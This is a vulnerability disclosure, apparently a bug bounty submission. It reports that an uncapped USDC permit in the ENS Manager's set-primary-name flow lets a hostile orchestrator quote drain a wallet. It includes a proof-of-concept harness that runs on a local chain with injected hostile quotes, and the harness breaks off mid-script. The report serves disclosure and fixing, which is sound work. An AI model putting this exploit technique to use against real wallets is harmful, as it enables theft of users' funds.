# 92463 w a high unbounded eip 2612 permit in planhcaintentfunding lets a hostile intent quote drain the connected wallet s usdc on a transaction whose amount the app never displays

**Submitted on Sep 10th 2026 at 01:19:43 UTC by @Pwning for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92463
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

Setting a primary name in the Manager app opens a USDC permit in the user's wallet. The value in that permit comes from the Rhinestone orchestrator's quote, and nothing on the path applies a ceiling to it or compares it against the rent the app has already read on chain. The dialog that starts the flow shows no figure at all, so the user has nothing to check the wallet prompt against. A hostile or compromised orchestrator response makes the wallet sign an allowance of any size, and that allowance is then spent by a `transferFrom` in the same batch. I proved the whole path on a local chain with a real ERC-2612 token: an injected quote of 1,000,000 USDC, and a second of 2\*\*200, each reached the emitted calldata unchanged, were accepted by the token's `ecrecover`, became the on-chain allowance, and left the owner's wallet.

## Vulnerability Details

The flow starts in `apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx`, which calls `useSetPrimaryName` and reaches `apps/manager/src/features/profile/service/setPrimaryName.ts`. That file strips the session before funding the intent:

```ts
// apps/manager/src/features/profile/service/setPrimaryName.ts:189
const ownerSigner: RhinestoneSigner = { ...signer, session: undefined }
```

The comment immediately above it explains the choice and states its consequence:

```
// Owner-signed on purpose: changing the primary identity warrants an
// explicit wallet approval, and it keeps the claim leg independent of the
// session's action allowlist — `claimWithHCA` is NOT one of the five targets
// `HCAOwnerAndSessionValidator` allows a session to call, so a session-signed
// version of this batch would revert `ActionNotAllowed`. The owner-signed
// path takes the 65-byte ECDSA branch in `isValidSignatureWithSender`, which
// applies no action policy at all — which is also what makes the funding
// permit legal here, unlike inside the session-signed commit leg.
```

`planHcaIntentFunding` in `packages/transaction-manager/src/helpers/hca-intent-funding.ts` then sizes the permit. The chain of values is:

```
setPrimaryName.ts:191            planHcaIntentFunding(...)
hca-intent-funding.ts:111        quoteIntentUsdc(...)          (called at :234)
hca-intent-funding.ts:137        return readUsdcSpend(prepared.intentRoute?.intentCost, chain.id)
registration.hca.actors.ts:140   return BigInt(entry.locked ?? '0') + BigInt(entry.unlocked ?? '0')
hca-intent-funding.ts:234        const quotedFeeUsdc = await quoteIntentUsdc({ ... })
hca-intent-funding.ts:255        const shortfall = quotedFeeUsdc - balance
hca-intent-funding.ts:257-260    signFundingPermitActor({ ..., value: shortfall })
hca-intent-funding.ts:272-300    calls: [ permit(...), transferFrom(owner, hca, value) ]
```

`readUsdcSpend` adds the orchestrator's `locked` and `unlocked` figures with no ceiling. The only check between that number and the wallet prompt is a null test:

```ts
// packages/transaction-manager/src/helpers/hca-intent-funding.ts:241-242
if (quotedFeeUsdc === null) {
  throw new Error(
```

A null quote throws. A quote of 2\*\*200 does not. There is no absolute cap, no ratio check, and no comparison against the on-chain rent the app read moments earlier for the same operation.

Three separate defences that the sibling registration path has are absent here.

The amount is never displayed. Scanning `ChoosePrimaryNameDialog.tsx` for `usdc|formatUnits|formatUsd|fee|price|cost|permit|allowance|amount|total`, case-insensitive and whole-word, over its 612 lines returns 0 matches. The same scan over `apps/manager/src/features/register-v2/workflow/pricing/components/TokenPickerContent.tsx`, the registration screen that does price an intent, returns 52. The only transaction detail on the primary-name screen is the owner address.

No on-chain policy applies. Because the session is stripped, the batch is validated by the 65-byte ECDSA branch of the deployed `HCAOwnerAndSessionValidator` (`0x5f249FCa8bB4949105651146858c347E8BFb0F7E` on Sepolia, verified source). That contract declares `uint256 internal constant ECDSA_SIGNATURE_LENGTH = 65;` at line 127, and the branch guarded by it is this, at lines 576 to 583:

```solidity
if (data.length == ECDSA_SIGNATURE_LENGTH) {
    (address expectedOwner, ) = _ownerAndSessionNonce(msg.sender);
    if (_recover(hash, data) != expectedOwner) {
        revert InvalidSigner();
    }
} else {
    _validateFixedSession(hash, data);
}
```

The owner branch recovers the signer, compares it to the expected owner, and reverts on mismatch. It calls no policy check. Every policy check lives behind `_validateFixedSession` in the `else` branch, which a session-signed batch would take and this one does not. `MAX_REFUND_AMOUNT` (`packages/smart-account/src/providers/rhinestone/manifest.ts:205`, `100_000_000n`) bounds the orchestrator's gas-refund pull inside a session-signed action, so it does not apply here.

Nothing verifies the result afterwards. The registration path calls `verifyHcaRegistrationActor` (`registration.hca.actors.ts:912-946`), which requires `latestOwner === wallet`. Grepping `setPrimaryName.ts` for `verify|assert|check|expect` returns two hits, both in unrelated comments.

On the attacker: the number comes from the Rhinestone orchestrator, so the party who can supply it is whoever controls that endpoint's response, either by compromising it or from a network position. This is not reachable from an arbitrary website. I checked whether the endpoint could be steered from client state, and it cannot: it is read only from `import.meta.env.VITE_RHINESTONE_ENDPOINT_URL` at `apps/manager/src/lib/smart-account/rhinestone.ts:85`, a build-time constant. Unlike the API base URL in known issue #57, no persisted value redirects it. What is in scope here is the client's handling of that third party's answer: no bound, no cross-check, no display, and on this path alone, no on-chain backstop and no post-hoc check.

Searching `apps/manager/src`, `packages/transaction-manager/src` and `packages/smart-account/src` for `session: undefined` together with `planHcaIntentFunding` returns exactly one production site, so this combination has no siblings elsewhere in the app.

## Impact Details

The user approves a USDC allowance whose size the application never showed them, and the same batch spends it. On the exploit arms I ran, the owner's wallet balance fell by the full injected amount: 1,000,000,000,000 base units (1,000,000 USDC) on the first arm, and 1,606,938,044,258,990,275,541,962,092,341,162,602,522,202,993,782,792,835,301,376 base units (2\*\*200) on the second. The allowance itself is unbounded; what can actually be taken is capped by the victim's USDC balance, since `transferFrom` reverts when the amount exceeds it. A quote sized at or just below the victim's balance therefore takes all of it.

The cost to the user of reaching this state is one click on "set primary name", an operation with no obvious price attached, followed by approving a wallet prompt on a screen that offered no number to compare it with.

This matches impact row 6285, "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient", and specifically its second example, "showing the wrong recipient or amount on a transaction the user then approves". No amount is displayed at all, so the user has nothing to compare the wallet prompt against. It also matches row 6288, "Malicious interactions with an already-connected wallet", whose first example is "Modifying transaction arguments or parameters": the permit `value` is such an argument, and it is set from an unbounded third-party figure.

Known issue #32 (QA-03) covers a display-only disagreement between a per-year discounted price and a displayed total in the Explorer's modals, and then states that "a mismatch between the displayed total and the amount actually charged on-chain would be a new finding." This is that finding, in the Manager app, with the displayed total being the empty set.

What I have not demonstrated is settlement. The permit's spender is the victim's own Hybrid Custody Account, so what the PoC proves on chain is that the owner's USDC leaves the owner's wallet on an amount they were never shown. The loss completes when the intent settles and the orchestrator takes its fee. I am stating that boundary rather than implying the funds are already in an attacker's control.

## References

Root cause, in scope as `packages/transaction-manager`:

* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/packages/transaction-manager/src/helpers/hca-intent-funding.ts#L255>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/packages/transaction-manager/src/machines/registration/registration.hca.actors.ts#L140>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/packages/transaction-manager/src/helpers/hca-intent-funding.ts#L241>

Entry point and the missing display, in scope as `apps/manager`:

* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/manager/src/features/profile/service/setPrimaryName.ts#L189>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx>
* <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/manager/src/lib/smart-account/rhinestone.ts#L85>

Comparison points:

* Session refund cap that does not apply here: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/packages/smart-account/src/providers/rhinestone/manifest.ts#L205>
* Deployed validator whose owner branch applies no policy: <https://sepolia.etherscan.io/address/0x5f249FCa8bB4949105651146858c347E8BFb0F7E#code>
* EIP-2612: <https://eips.ethereum.org/EIPS/eip-2612>

## Suggested fix

Bound the quote before signing. The rent for the operation is read on chain immediately beforehand, so a ratio check costs nothing: refuse any quote whose fee exceeds a small multiple of the known cost, or apply an absolute ceiling next to the existing `MAX_REFUND_*` constants. Display the figure the wallet will be asked to permit on the dialog that starts the flow. Add a post-hoc check, as the registration path already does with `verifyHcaRegistrationActor`. Longer term, reconsider routing around the policy engine: if `claimWithHCA` cannot be a session target, adding it to the validator's allowlist would be safer than making "no policy at all" the price of setting a primary name.

## Proof of Concept

### What is real and what is supplied

The vendor's own `planHcaIntentFunding` and `signFundingPermitActor` run unmodified, bundled from the pinned TypeScript with the repository's own esbuild. The chain is a local anvil with chain id 11155111. A real ERC-2612 token is installed at the address `getDestinationContracts(11155111).usdc` returns, so `permit`, `transferFrom`, `nonces`, `balanceOf` and the EIP-712 domain read are real calls against real contract code, and the signature is checked by `ecrecover` inside the token.

The only thing the harness supplies is the Rhinestone orchestrator's `prepareTransaction` response. That is the third-party input this finding is about, and it is the single independent variable between the two arms.

The exploit arm injects two hostile quotes, each against a fresh HCA so that a previous arm's funding cannot shrink the next arm's shortfall. The control arm injects the honest fee the vendor itself recorded from a live quote, which the harness parses out of the source comment at `registration.hca.actors.ts:113` rather than hard-coding.

### Prerequisites

* `anvil` from Foundry on `PATH`, or at `~/.foundry/bin/anvil`
* The repository at `audit-comp-ready` with `pnpm install --frozen-lockfile` completed, so that `node_modules/.pnpm/esbuild@0.28.1` and `viem` resolve
* Node 22 or newer, which is the version the program's own setup instructions specify. I ran this on Node 26.8.1.

One optional input, and it changes two lines of the output. The harness also reads the deployed validator's verified source to count the policy checks in its owner branch, at `../onchain-verified-source/sepolia-0x5f249FCa-HCAOwnerAndSessionValidator/src/hca/HCAOwnerAndSessionValidator.sol` relative to the repository root. That file is not part of the repository. If you want those two measurements, download the verified source for `0x5f249FCa8bB4949105651146858c347E8BFb0F7E` from Sepolia Etherscan and place it at that path. Without it the harness reports `owner_branch_signature_bytes: 0` and `owner_branch_policy_checks: -1`, and nothing else changes: the permit, allowance and debit figures that carry this finding do not depend on it. I verified that by moving the file aside and re-running. The same two facts are quoted directly from the contract in the Vulnerability Details section above, so they can be checked on Etherscan without running anything.

### Steps

1. Clone the in-scope repository and install dependencies:

   ```
   git clone https://github.com/immunefi-team/audit-comp-ens.git
   cd audit-comp-ens
   git checkout audit-comp-ready        # 1c9b47f18fcddd2e864dfe385c4171061c9811ae
   pnpm install --frozen-lockfile
   ```
2. From the repository root, create `poc-rig/` and save the two files below into it as `poc-rig/h3.mjs` and `poc-rig/Usdc6.sol`.
3. Run the exploit arm:

   ```
   node poc-rig/h3.mjs exploit
   ```
4. Run the control arm:

   ```
   node poc-rig/h3.mjs control
   ```

The harness starts and stops its own anvil on port 8871. Override with `H3_ANVIL_PORT` if that port is busy.

### Observed output, exploit arm

Produced with the optional validator source in place. Without it, the two `owner_branch_*` lines read `0` and `-1` as described above.

```
mode: exploit
impact_row: 6285
chain_is_local_anvil: 1
permit_value_is_shortfall: 1
bounds_on_shortfall_before_permit: 0
bounds_in_read_usdc_spend: 0
session_stripped_at_entry: 1
dialog_money_render_sites: 0
sibling_dialog_money_render_sites: 52
vendor_recorded_live_fee_usdc: 905736
chain_id: 11155111
dialog_lines: 612
owner_branch_signature_bytes: 65
owner_branch_policy_checks: 0
injected_arm1_whole_usdc: 1000000
injected_arm2_exponent_of_two: 200
injected_usdc_arm1: 1000000000000
permit_value_arm1: 1000000000000
transferfrom_value_arm1: 1000000000000
onchain_allowance_arm1: 1000000000000
wallet_debited_arm1: 1000000000000
injected_usdc_arm2: 1606938044258990275541962092341162602522202993782792835301376
permit_value_arm2: 1606938044258990275541962092341162602522202993782792835301376
transferfrom_value_arm2: 1606938044258990275541962092341162602522202993782792835301376
onchain_allowance_arm2: 1606938044258990275541962092341162602522202993782792835301376
wallet_debited_arm2: 1606938044258990275541962092341162602522202993782792835301376
```

`injected_usdc_armN` is what the orchestrator returned. `permit_value_armN` is decoded from the emitted calldata by viem. `onchain_allowance_armN` is read back off the token after the permit lands. `wallet_debited_armN` is the drop in the owner's `balanceOf` after `transferFrom`. All four are equal on both arms, so the injected figure reaches the chain unchanged.

### Observed output, control arm

```
mode: control
injected_usdc_honest: 905736
permit_value_honest: 905736
transferfrom_value_honest: 905736
onchain_allowance_honest: 905736
wallet_debited_honest: 905736
```

The same code path with an honest quote produces an honest permit, which is what makes the exploit arm attributable to the injected value rather than to the harness.

### Confirming the fix closes it

Apply a ceiling to the pinned source at `packages/transaction-manager/src/helpers/hca-intent-funding.ts:255`:

```ts
  const shortfall = quotedFeeUsdc - balance
  if (shortfall > 100_000_000n) {
    throw new Error('Quoted HCA funding exceeds the ceiling for a standalone intent.')
  }
```

Re-running `node poc-rig/h3.mjs exploit` then reports `permit_value_arm1: 0`, `onchain_allowance_arm1: 0` and `wallet_debited_arm1: 0`, with `plan_refused_arm1` carrying the error, while `node poc-rig/h3.mjs control` still completes and still measures 905736. Revert the edit afterwards.

### `poc-rig/h3.mjs`

```javascript
#!/usr/bin/env node
/**
 * H3 — `setPrimaryNameWithHca` signs an unbounded EIP-2612 USDC permit whose value the
 *      application never renders.
 *
 * WHAT IS REAL HERE
 *   - `planHcaIntentFunding` is the vendor's own function, bundled from the pinned TypeScript
 *     at run time with esbuild (type erasure is what the real build does).
 *   - `signFundingPermitActor` is the vendor's own actor. It is NOT replaced.
 *   - The chain is a local anvil at the port this hunt owns. `readContract`,
 *     `getEip712Domain`, `nonces`, `balanceOf`, `permit` and `transferFrom` are real
 *     eth_calls / transactions against a real ERC-2612 token whose runtime code is installed
 *     at the address `getDestinationContracts(11155111).usdc` returns.
 *   - The signature is produced by a real viem local account and is verified by `ecrecover`
 *     inside the token, so the permit that lands on chain is the one the wallet signed.
 *
 * WHAT IS SUPPLIED BY THE ATTACKER (this is the input, not the component under test)
 *   - the Rhinestone orchestrator's `prepareTransaction` response. That is the third party
 *     whose number this finding says the client fails to bound. Its value is the exploit's
 *     independent variable; every other number below is measured.
 *
 * NOTHING ABOUT THE DEFECT IS TRANSCRIBED. The bound-count, the permit binding, the session
 * strip and the honest control fee are all parsed out of the pinned source at run time, at the
 * SITE rather than file-wide, so the checker's fix arm can move them.
 */
import { spawn } from 'node:child_process'
import { existsSync, readFileSync, writeFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { tmpdir } from 'node:os'

function findRepo(s) {
  let d = s
  for (let i = 0; i < 8; i++) {
    if (existsSync(join(d, 'pnpm-workspace.yaml')) && existsSync(join(d, 'apps/manager'))) return d + '/'
    const c = join(d, 'repos/audit-comp-ens')
    if (existsSync(join(c, 'pnpm-workspace.yaml'))) return c + '/'
    d = dirname(d)
  }
  throw new Error('worktree not found')
}
const REPO = findRepo(dirname(new URL(import.meta.url).pathname))
const read = (p) => readFileSync(REPO + p, 'utf8')

const FUNDING = 'packages/transaction-manager/src/helpers/hca-intent-funding.ts'
const ACTORS = 'packages/transaction-manager/src/machines/registration/registration.hca.actors.ts'
const ENTRY = 'apps/manager/src/features/profile/service/setPrimaryName.ts'
const DIALOG = 'apps/manager/src/features/dashboard/components/ChoosePrimaryNameDialog.tsx'
const SIBLING = 'apps/manager/src/features/register-v2/workflow/pricing/components/TokenPickerContent.tsx'

const fundingSrc = read(FUNDING)
const actorsSrc = read(ACTORS)
const entrySrc = read(ENTRY)

// ---------------------------------------------------------------- static derivation
// (1) Capture the variable the shortfall is bound to, then look ONLY at the span between
//     that assignment and the permit-signing call. A file-wide search would hit the
//     `balance >= quotedFeeUsdc` early return, which is a lower bound on a different
//     variable and would wrongly read as a guard.
const shortfallDecl = fundingSrc.match(/const\s+(\w+)\s*=\s*quotedFeeUsdc\s*-\s*balance/)
if (!shortfallDecl) throw new Error('shortfall assignment not found at the pin')
const shortfallVar = shortfallDecl[1]
const spanStart = shortfallDecl.index + shortfallDecl[0].length
const permitCallIdx = fundingSrc.indexOf('signFundingPermitActor(', spanStart)
if (permitCallIdx < 0) throw new Error('permit call not found after the shortfall')
const span = fundingSrc.slice(spanStart, permitCallIdx)
const boundRe = new RegExp(`\\b${shortfallVar}\\s*[<>]|Math\\.min\\s*\\(\\s*${shortfallVar}|clamp\\s*\\(\\s*${shortfallVar}`, 'g')
const boundsOnShortfall = (span.match(boundRe) || []).length

// (2) Is the permit's `value` actually bound to that variable? (the binding the bug needs)
const permitArgs = fundingSrc.slice(permitCallIdx, permitCallIdx + 400)
const permitValueIsShortfall = new RegExp(`value:\\s*${shortfallVar}\\b`).test(permitArgs) ? 1 : 0

// (3) The upstream producer: readUsdcSpend's return expression, again at the site.
const spendFn = actorsSrc.slice(actorsSrc.indexOf('export function readUsdcSpend'))
const spendBody = spendFn.slice(0, spendFn.indexOf('\n}\n'))
const spendReturn = (spendBody.match(/return\s+BigInt\([\s\S]*?\n/) || [''])[0]
const boundsInReadUsdcSpend = (spendReturn.match(/Math\.min|clamp|>\s*|<\s*/g) || []).length

// (4) The session strip that takes the unpoliced owner branch.
const sessionStripped = /\{\s*\.\.\.signer,\s*session:\s*undefined\s*\}/.test(entrySrc) ? 1 : 0

// (5) Does the screen that launches this ever render a money figure?
const MONEY = /usdc|formatUnits|formatUsd|\bfee\b|\bprice\b|\bcost\b|\bpermit\b|allowance|\bamount\b|\btotal\b/gi
const dialogMoneySites = (read(DIALOG).match(MONEY) || []).length
const siblingMoneySites = (read(SIBLING).match(MONEY) || []).length

// (6) The DEPLOYED validator's owner branch, from the verified source fetched into this
//     workspace. The constant is read, not typed; the branch body is sliced and its policy
//     calls counted, so "no action policy at all" is a count and not an adjective.
const VALIDATOR = '../onchain-verified-source/sepolia-0x5f249FCa-HCAOwnerAndSessionValidator/src/hca/HCAOwnerAndSessionValidator.sol'
let ownerBranchSigBytes = 0
let ownerBranchPolicyChecks = -1
try {
  const vsrc = read(VALIDATOR)
  const lenDecl = vsrc.match(/constant\s+ECDSA_SIGNATURE_LENGTH\s*=\s*(\d+)/)
  ownerBranchSigBytes = lenDecl ? Number(lenDecl[1]) : 0
  const branchStart = vsrc.indexOf('if (data.length == ECDSA_SIGNATURE_LENGTH) {')
  const branchEnd = vsrc.indexOf('} else {', branchStart)
  const branch = branchStart >= 0 && branchEnd > branchStart ? vsrc.slice(branchStart, branchEnd) : ''
  ownerBranchPolicyChecks = (branch.match(/_check\w*|Policy|Refund|refund|resolver/g) || []).length
} catch {
  ownerBranchPolicyChecks = -1
}

// (6) The honest fee for the control arm, parsed out of the vendor's OWN recorded live quote
//     in the doc comment above readUsdcSpend. Not a number this rig chose.
const honestQuote = actorsSrc.match(/unlocked:\s*'(\d+)'\}\}\}`?/) || actorsSrc.match(/unlocked:\s*'(\d+)'/)
if (!honestQuote) throw new Error('vendor live quote not found at the pin')
const HONEST_FEE = BigInt(honestQuote[1])

// ---------------------------------------------------------------- the local chain
const PORT = Number(process.env.H3_ANVIL_PORT || 8871)
const CHAIN_ID = 11155111
const RPC = `http://127.0.0.1:${PORT}`
const OWNER_PK = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
// One HCA per arm: the shortfall is `quotedFee - hcaBalance`, so an arm re-using an HCA that
// a previous arm already funded would measure a permit smaller than the injection by exactly
// that funding, and the "flows through unchanged" claim would read as an off-by-one.
const HCA_PKS = {
  honest: '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
  arm1: '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
  arm2: '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
}

// A real ERC-2612 token, compiled with solc 0.8.36 from poc-rig/Usdc6.sol. It is
// address-independent (the EIP-712 domain is computed from address(this) at call time), so
// its runtime code can be installed at whatever address the vendor manifest names.
const USDC_RUNTIME = '0x608060405234801561000f575f5ffd5b506004361061009b575f3560e01c806354fd4d501161006357806354fd4d501461014057806370a08231146101605780637ecebe001461017f578063d505accf1461019e578063dd62ed3e146101b1575f5ffd5b806306fdde031461009f57806323b872dd146100d8578063313ce567146100fb5780633644e5151461011557806340c10f191461012b575b5f5ffd5b6100c2604051806040016040528060048152602001635553444360e01b81525081565b6040516100cf9190610624565b60405180910390f35b6100eb6100e6366004610674565b6101db565b60405190151581526020016100cf565b610103600681565b60405160ff90911681526020016100cf565b61011d6102fc565b6040519081526020016100cf565b61013e6101393660046106ae565b6103c7565b005b6100c2604051806040016040528060018152602001601960f91b81525081565b61011d61016e3660046106d6565b5f6020819052908152604090205481565b61011d61018d3660046106d6565b60026020525f908152604090205481565b61013e6101ac3660046106f6565b6103f7565b61011d6101bf366004610763565b600160209081525f928352604080842090915290825290205481565b6001600160a01b0383165f9081526001602090815260408083203384529091528120548281101561023f5760405162461bcd60e51b8152602060048201526009602482015268616c6c6f77616e636560b81b60448201526064015b60405180910390fd5b5f1981146102755761025183826107a8565b6001600160a01b0386165f9081526001602090815260408083203384529091529020555b6001600160a01b0385165f908152602081905260409020548311156102c65760405162461bcd60e51b815260206004820152600760248201526662616c616e636560c81b6044820152606401610236565b50506001600160a01b039283165f9081526020819052604080822080548490039055929093168352912080549091019055600190565b60408051808201825260048152635553444360e01b6020918201528151808301835260018152601960f91b9082015281517f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f818301527fd6aca1be9729c13d677335161321649cccae6a591554772516700f986f942eaa818401527fad7c5bef027816a800da1736444fb58a807ef4c9603b7848673f7e3a68eb14a560608201524660808201523060a0808301919091528351808303909101815260c0909101909252815191012090565b6001600160a01b0382165f90815260208190526040812080548392906103ee9084906107c1565b90915550505050565b8342111561043a5760405162461bcd60e51b815260206004820152601060248201526f1152540c8d8c4c8e88195e1c1a5c995960821b6044820152606401610236565b5f6104436102fc565b6001600160a01b0389165f90815260026020526040812080547f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9928c928c928c92909190610490836107d4565b909155506040805160208101969096526001600160a01b0394851690860152929091166060840152608083015260a082015260c0810187905260e0016040516020818303038152906040528051906020012060405160200161050992919061190160f01b81526002810192909252602282015260420190565b60408051601f1981840301815282825280516020918201205f80855291840180845281905260ff88169284019290925260608301869052608083018590529092509060019060a0016020604051602081039080840390855afa158015610571573d5f5f3e3d5ffd5b5050604051601f1901519150506001600160a01b038116158015906105a75750886001600160a01b0316816001600160a01b0316145b6105f35760405162461bcd60e51b815260206004820152601a60248201527f454950323631323a20696e76616c6964207369676e61747572650000000000006044820152606401610236565b5050506001600160a01b039586165f9081526001602090815260408083209790981682529590955250505091902055565b602081525f82518060208401528060208501604085015e5f604082850101526040601f19601f83011684010191505092915050565b80356001600160a01b038116811461066f575f5ffd5b919050565b5f5f5f60608486031215610686575f5ffd5b61068f84610659565b925061069d60208501610659565b929592945050506040919091013590565b5f5f604083850312156106bf575f5ffd5b6106c883610659565b946020939093013593505050565b5f602082840312156106e6575f5ffd5b6106ef82610659565b9392505050565b5f5f5f5f5f5f5f60e0888a03121561070c575f5ffd5b61071588610659565b965061072360208901610659565b95506040880135945060608801359350608088013560ff81168114610746575f5ffd5b9699959850939692959460a0840135945060c09093013592915050565b5f5f60408385031215610774575f5ffd5b61077d83610659565b915061078b60208401610659565b90509250929050565b634e487b7160e01b5f52601160045260245ffd5b818103818111156107bb576107bb610794565b92915050565b808201808211156107bb576107bb610794565b5f600182016107e5576107e5610794565b506001019056fea26469706673582212207291647a9f67451b592d8a2b4bb4b77ab8fa7fbd7779bb1684b5b4ce1fccfdcc64736f6c63430008240033'

async function rpc(method, params) {
  const r = await fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  const j = await r.json()
  if (j.error) throw new Error(`${method}: ${j.error.message}`)
  return j.result
}

async function waitForChain(ms = 20000) {
  const deadline = Date.now() + ms
  for (;;) {
    try {
      await rpc('eth_chainId', [])
      return
    } catch {
      if (Date.now() > deadline) throw new Error('anvil did not come up')
      await new Promise((r) => setTimeout(r, 120))
    }
  }
}

function anvilBinary() {
  const home = process.env.HOME || ''
  const local = join(home, '.foundry/bin/anvil')
  return existsSync(local) ? local : 'anvil'
}

// ---------------------------------------------------------------- the vendor's own code
async function loadVendor() {
  const esbuild = await import(REPO + 'node_modules/.pnpm/esbuild@0.28.1/node_modules/esbuild/lib/main.js')
  const built = await esbuild.build({
    stdin: {
      contents: [
        "export { planHcaIntentFunding } from './src/helpers/hca-intent-funding'",
        "export { readUsdcSpend } from './src/machines/registration/registration.hca.actors'",
        "export { getDestinationContracts } from '@ens-apps/smart-account'",
        "export * as viem from 'viem'",
        "export * as viemAccounts from 'viem/accounts'",
        "export * as viemChains from 'viem/chains'",
      ].join('\n'),
      resolveDir: REPO + 'packages/transaction-manager',
      loader: 'ts',
      sourcefile: 'h3-entry.ts',
    },
    bundle: true,
    platform: 'node',
    format: 'esm',
    target: 'node22',
    absWorkingDir: REPO,
    write: false,
    logLevel: 'silent',
    banner: { js: "import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);" },
  })
  const out = join(tmpdir(), `h3-vendor-${process.pid}.mjs`)
  writeFileSync(out, built.outputFiles[0].text)
  return import('file://' + out)
}

const erc2612 = [
  'function mint(address to, uint256 amount)',
  'function balanceOf(address a) view returns (uint256)',
  'function allowance(address o, address s) view returns (uint256)',
  'function nonces(address o) view returns (uint256)',
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
]

async function run(mode) {
  const V = await loadVendor()
  const { viem, viemAccounts, viemChains, getDestinationContracts, planHcaIntentFunding } = V
  const USDC = getDestinationContracts(CHAIN_ID).usdc
  const abi = viem.parseAbi(erc2612)
  const permitAbi = viem.parseAbi([
    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
    'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  ])

  const owner = viemAccounts.privateKeyToAccount(OWNER_PK)
  const chain = { ...viemChains.sepolia, id: CHAIN_ID, rpcUrls: { default: { http: [RPC] } } }
  const publicClient = viem.createPublicClient({ chain, transport: viem.http(RPC) })
  const ownerWallet = viem.createWalletClient({ account: owner, chain, transport: viem.http(RPC) })

  // Install the token at the address the vendor manifest names, then fund the owner EOA.
  await rpc('anvil_setCode', [USDC, USDC_RUNTIME])
  const seed = (1n << 200n) + 10n ** 15n
  const mintHash = await ownerWallet.writeContract({ address: USDC, abi, functionName: 'mint', args: [owner.address, seed] })
  await publicClient.waitForTransactionReceipt({ hash: mintHash })

  // The orchestrator's answer. In `exploit` it is hostile; in `control` it is the figure the
  // vendor recorded from a real quote. Same function, same path, same wallet — one variable.
  const arms =
    mode === 'control'
      ? [{ tag: 'honest', usdc: HONEST_FEE }]
      : [
          { tag: 'arm1', usdc: 1_000_000n * 1_000_000n },
          { tag: 'arm2', usdc: 1n << 200n },
        ]

  const results = []
  for (const arm of arms) {
    const quoted = arm.usdc
    const hcaAccount = viemAccounts.privateKeyToAccount(HCA_PKS[arm.tag])
    const hcaWallet = viem.createWalletClient({ account: hcaAccount, chain, transport: viem.http(RPC) })
    const orchestrator = {
      getAddress: () => hcaAccount.address,
      prepareTransaction: async () => ({
        intentRoute: {
          intentCost: {
            tokensSpent: { [String(CHAIN_ID)]: { [USDC.toLowerCase()]: { locked: '0', unlocked: quoted.toString() } } },
            gasCost: { totalUSD: 0.9065 },
          },
        },
      }),
    }

    const before = await publicClient.readContract({ address: USDC, abi, functionName: 'balanceOf', args: [owner.address] })

    let permitValue = 0n
    let transferValue = 0n
    let allowanceAfter = 0n
    let debited = 0n
    try {
      const plan = await planHcaIntentFunding({
        signer: { account: orchestrator, session: undefined },
        ownerAddress: owner.address,
        approvalSigner: { type: 'eoa', walletClient: ownerWallet },
        publicClient,
        chainId: CHAIN_ID,
        calls: [{ to: USDC, value: 0n, data: '0x' }],
      })

      // Decode what the batch will actually carry. No reasoning about calldata: viem reads it.
      const decoded = plan.calls.map((c) => {
        try {
          return viem.decodeFunctionData({ abi: permitAbi, data: c.data })
        } catch {
          return null
        }
      })
      const permitCall = decoded.find((d) => d && d.functionName === 'permit')
      const transferCall = decoded.find((d) => d && d.functionName === 'transferFrom')
      permitValue = permitCall ? permitCall.args[2] : 0n
      transferValue = transferCall ? transferCall.args[2] : 0n

      // Land the signed permit on the real token. ecrecover inside the contract is the
      // check that the value the wallet signed is the value that becomes an allowance.
      const idx = plan.calls.findIndex((c) => {
        try {
          return viem.decodeFunctionData({ abi: permitAbi, data: c.data }).functionName === 'permit'
        } catch {
          return false
        }
      })
      if (idx >= 0) {
        const h1 = await ownerWallet.sendTransaction({ to: USDC, data: plan.calls[idx].data })
        await publicClient.waitForTransactionReceipt({ hash: h1 })
        allowanceAfter = await publicClient.readContract({
          address: USDC, abi, functionName: 'allowance', args: [owner.address, hcaAccount.address],
        })
        const h2 = await hcaWallet.writeContract({
          address: USDC, abi, functionName: 'transferFrom', args: [owner.address, hcaAccount.address, transferValue],
        })
        await publicClient.waitForTransactionReceipt({ hash: h2 })
        const after = await publicClient.readContract({ address: USDC, abi, functionName: 'balanceOf', args: [owner.address] })
        debited = before - after
      }
